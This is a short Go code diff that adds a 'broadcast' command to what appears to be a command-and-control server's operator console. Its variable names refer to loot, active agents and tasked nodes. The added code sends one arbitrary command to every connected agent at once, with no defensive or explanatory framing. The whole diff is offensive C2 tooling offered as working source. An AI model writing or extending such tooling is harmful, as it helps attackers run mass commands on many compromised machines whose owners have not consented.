@@ -324,6 +324,22 @@ func handleCommand(cmd string) {
 			}
 		}
 		lootMutex.Unlock()
+	case "broadcast":
+		if len(fields) < 2 {
+			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: broadcast <CMD>\n", ts)
+			return
+		}
+		command := strings.Join(fields[1:], " ")
+		agentMutex.Lock()
+		taskMutex.Lock()
+		count := 0
+		for id := range activeAgents {
+			agentTasks[id] = command
+			count++
+		}
+		taskMutex.Unlock()
+		agentMutex.Unlock()
+		fmt.Fprintf(agentLog, "[%s] [yellow]BROADCAST_SENT >[white] Tasked %d nodes with: %s\n", ts, count, command)
 	case "clear":
 		agentLog.Clear()
 	case "exit":
